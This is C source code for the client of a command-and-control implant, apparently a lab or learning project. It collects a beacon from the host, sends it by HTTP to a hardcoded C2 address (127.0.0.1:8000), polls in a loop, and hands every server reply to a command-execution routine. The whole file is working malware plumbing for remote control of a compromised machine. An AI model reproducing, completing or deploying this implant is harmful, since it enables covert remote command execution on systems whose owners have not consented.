#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "beacon.h"
#include "command.h"
#include "colors.h"

#define RHOST "127.0.0.1"
#define RPORT 8000
#define RPORT_STR "8000"
#define BEACON_RESP_MAX_SIZE 2048

#define ABORT (-1)
#define RETRY_LATER 0
#define OK 1

int timeout = 15;		// seconds
//int ID = 0; // need to ensure persistence

int connect_to_c2(const char *host, int port)
{
	int sockfd;

	/* Set host address and port */
	printf("[*] Setting c2 address and port...");
	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(RPORT);
	if (inet_pton(AF_INET, RHOST, &serv_addr.sin_addr) <= 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Creating socket...");
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	/* Set receive timeout on socket */
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = 0;
	printf("[*] Setting timeout %d seconds...", tv.tv_sec);
	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
		       sizeof(struct timeval)) == -1) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Connecting to c2 server...");
	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
	    0) {
		printf(RED("failed\n"));
		return RETRY_LATER;
	}
	printf("done\n");

	return sockfd;
}

#define HTTP_REQ_MAX_SIZE 2048

char *build_http_request(char *data)
{
	char *http_req = malloc(HTTP_REQ_MAX_SIZE);

	if (http_req != NULL) {
		sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
			"Host: " RHOST ":" RPORT_STR "\r\n"
			"Content-Length: %d\r\n\r\n%s", strlen(data), data);
	}

	return http_req;
}

char *get_beacon_resp(int sockfd)
{
	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
	if (buf == NULL) {
		printf("malloc\n");
		return NULL;
	}

	/* Should read HTTP header to make sure the entire reply
	   is received before moving on */
	printf("[*] Waiting for c2 server to reply...");
	fflush(stdout);
	int received = 0;
	int tot_read = 0;
	ssize_t numread = 0;
	char *pos = buf;
	do {
		numread = recv(sockfd, pos, BEACON_RESP_MAX_SIZE - tot_read, 0);
		if (numread > 0) {
			tot_read += numread;
			pos += numread;
			//printf("received %d bytes\n", numread);
			received = 1;
		} else if (numread == 0) {
			printf("received %d bytes\n", tot_read);
		} else if (numread == -1) {
			if (errno == EAGAIN && errno == EWOULDBLOCK) {
				printf(RED("timed out\n"));
			} else {
				printf(RED("error\n"));
			}
		}
	} while (numread > 0);

	return buf;
	//else
	//      free(buf);
}

int send_beacon(int sockfd, char *request, size_t request_len)
{
	if (request == NULL || request_len == 0)
		return ABORT;	/* If no beacon could be retrieved, abort */

	printf("[*] Sending HTTP request to server:\n%s\n", request);

	int numsent;
	char *pos = request;
	while (request_len > 0) {
		numsent = send(sockfd, pos, request_len, 0);
		if (numsent >= 0) {
			request_len -= numsent;
			if (request_len)
				pos += numsent;
		} else {
			printf("[*] Error: %s\n", strerror(errno));
			printf("[*] Could not send beacon, will retry\n");
			printf("[*] Closing socket\n");
			return RETRY_LATER;
		}
	}

	printf("[*] Beacon sent\n");

	return OK;

	//printf("[*] Closing socket\n");
	//close(sockfd);
}

int main(int argc, char *argv[])
{
	printf("[*] Acquiring beacon...");
	char *beacon = get_beacon();
	if (beacon == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(GREEN("done:\n") "%s", beacon);

	printf("[*] Building HTTP request...");
	char *http_request = build_http_request(beacon);
	if (http_request == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(GREEN("done\n"));

	while (1) {
		int sockfd, ret;
		ret = connect_to_c2(RHOST, RPORT);
		if (ret == ABORT) {
			/* We don't have a working socket */
			break;
		} else if (ret == RETRY_LATER) {
			/* We don't have a working socket */
			sleep(timeout);
			continue;
		}
		/* We have a working socket */
		sockfd = ret;

		ret = send_beacon(sockfd, http_request, strlen(http_request));
		if (ret == ABORT) {
			close(sockfd);
			break;
		} else if (ret == RETRY_LATER) {
			close(sockfd);
			printf(YELLOW
			       ("[*] Sleep %d seconds before retrying..."),
			       timeout);
			fflush(stdout);
			sleep(timeout);
			printf("done\n");
		} else {	//if (response != NULL) {
			char *response = get_beacon_resp(sockfd);
			/* If the response is empty or invalid, you might wanna check
			   it here and skip the call to exec_commands */
			printf("[*] Server response:\n%s\n", response);
			printf(BLUE("[*] Moving to execution subsystem\n"));
			exec_commands(response);
			printf(BLUE("[*] Exiting executing subsystem\n"));
			free(response);
			sleep(timeout);
		}
	}

	free(beacon);
	free(http_request);

	return 0;
}
